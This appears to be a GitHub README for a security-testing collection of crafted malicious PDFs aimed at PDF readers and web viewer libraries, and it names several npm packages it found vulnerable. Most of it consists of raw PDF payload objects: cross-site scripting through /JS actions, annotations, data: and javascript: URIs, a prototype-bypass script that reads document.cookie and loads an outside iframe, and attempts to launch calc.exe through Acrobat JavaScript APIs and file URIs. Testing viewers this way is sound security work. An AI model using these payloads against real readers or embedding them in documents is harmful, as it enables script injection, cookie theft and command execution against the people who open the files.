# Payloads All The PDFs

<a href="https://twitter.com/intent/follow?screen_name=evaristegal0is"><img src="https://img.shields.io/twitter/follow/evaristegal0is?style=social" alt="Follow @evaristegal0is"></a>

A list of crafted malicious PDF files to test the security of PDF readers and tools.</br>

### Vulnerabilities found

- [Foxit PDF SDK For Web](https://www.npmjs.com/package/@foxitsoftware/foxit-pdf-sdk-for-web-library) 7.5.0 (~600 weekly downloads)
- [PDFTron WebViewer](https://www.npmjs.com/package/@pdftron/webviewer) 7.2.0, 7.3.1, 8.6.1 (~54k weekly downloads)
- [PSPDFKit for Web](https://www.npmjs.com/package/pspdfkit) 2021.4.1 (~13k weekly downloads)
- [Syncfusion ej2-pdfviewer](https://www.npmjs.com/package/@syncfusion/ej2-pdfviewer) 20.2.40 (~6.8k weekly downloads)
- [React PDF viewer](https://www.npmjs.com/package/@react-pdf-viewer/core) 3.6.0 (~34k weekly downloads)

## Payloads list

### payload1.pdf

**Line 31**. Understand if [Acrobat Javascript APIs](https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/AcrobatDC_js_api_reference.pdf) are supported.
```
/JS (app.alert\(1\); Object.getPrototypeOf(function*(){}).constructor = null; ((function*(){}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src=https://14.rs>');"))().next();)
```

**Line 69**. Try to run arbitrary Javascript abusing the data URI scheme.
```
/URI (data:text/html,<script>alert\(2\);</script>)
```

**Line 177**. Try to inject Javascript code using annotations.
```
<</Type /Annot /Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126 ] /Subtype /Text /M (D:20210402013803+02'00) /C [1 1 0 ] /Popup 15 0 R /T (\">'><details open ontoggle=confirm\(3\)>) /P 6 0 R /Contents (��^@"^@>^@'^@>^@<^@d^@e^@t^@a^@i^@l^@s^@ ^@o^@p^@e^@n^@ ^@o^@n^@t^@o^@g^@g^@l^@e^@=^@c^@o^@n^@f^@i^@r^@m^@\(^@'^@X^@S^@S^@'^@\)^@>) >>
```

### payload2.pdf

**Line 69**. Try to run arbitrary Javascript abusing the data URI scheme.
```
/URI (\">'><details open ontoggle=confirm\(2\)>)
```

### payload3.pdf

**Line 31**. Understand if the PDF reader or tool runs arbitrary Javascript bypassing the Acrobat APIs.
```
/JS (app.alert\(1\); confirm\(2\); prompt\(document.cookie\); document.write\("<iframe src='https://14.rs'>"\);)
```

**Line 69**. Try to run remote commands on Windows.
```
/URI (file:///C:/Windows/system32/calc.exe)
```

### payload4.pdf

**Line 31**. Try to run remote commands on Windows by abusing Acrobat Javascript APIs.
```
/JS (app.alert\(1\); app.openDoc("/C/Windows/System32/calc.exe");)
```

**Line 69**. Try to run remote commands on Windows.
```
 /URI (START C:/\Windows/\system32/\calc.exe)
```

### payload5.pdf

**Line 31**. Try to run remote commands on Windows by abusing Acrobat Javascript APIs.
```
/JS (app.alert\(1\); app.launchURL\("START C:/\Windows/\system32/\calc.exe", true\); app.launchURL\("javascript:confirm\(3\);", true\);)
```

**Line 69**. Try to run arbitrary Javascript abusing the data URI scheme.
```
 /URI (javascript:confirm\(2\);)
```

### payload6.pdf

**Line 31**. Try to run remote commands on Windows by abusing Acrobat Javascript APIs.
```
 /JS (app.alert\(1\); app.launchURL\("/C/Windows/system32/calc.exe", true\); app.launchURL\("'><details open ontoggle=confirm\(3\);", true\);)
```

___

![Hack the planet](img/hack_the_planet.gif)

If you want to support me you can offer me a coffee ☕</br></br>
<a href="https://www.buymeacoffee.com/gubello" target="_blank"><img src="https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important;width: auto !important;" ></a>
